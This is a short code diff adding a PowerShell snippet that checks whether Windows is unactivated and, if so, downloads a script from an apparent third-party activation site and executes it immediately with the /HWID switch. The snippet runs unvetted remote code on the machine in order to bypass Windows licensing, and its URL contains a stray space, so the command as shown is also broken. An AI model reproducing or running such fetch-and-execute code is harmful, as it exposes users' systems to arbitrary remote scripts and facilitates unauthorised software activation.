@@ -1,0 +1,3 @@
+if (Get-CimInstance SoftwareLicensingProduct -Filter "partialproductkey is not null" | ? name -like windows* | select LicenseStatus | Select-String -Pattern "LicenseStatus=0"){
+  & ([ScriptBlock]::Create((irm https://mass grave.dev/get))) /HWID
+}
